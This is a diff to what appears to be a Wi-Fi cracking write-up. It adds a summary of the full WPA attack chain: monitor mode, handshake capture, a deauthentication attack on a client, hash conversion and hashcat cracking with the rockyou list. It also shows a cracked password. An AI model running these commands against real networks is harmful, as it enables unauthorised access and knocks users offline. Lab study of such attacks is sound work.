@@ -152,13 +152,14 @@ Dictionary cache built:
 2cb6de5d524865fdc6c949266d4733f7:f09fc2712212:286c076ff943:wifi-mobile:starwars1
 ```
 
+### Summary
 
 ```bash
+airmon-ng start wlan0
+airodump-ng wlan0mon --band abg
+airodump-ng wlan0mon -c <channel> --bssid <target_ap> -w wpa_handshake
+aireplay-ng -0 1 -a <target_ap> -c <target_client> wlan0mon
+hcxpcapngtool wpa_handshake-01.cap -o wpa_out
+hashcat -m 22000 wpa_out /opt/rockyou.txt
 ```
 
-
-```bash
-```
-
-```bash
-```
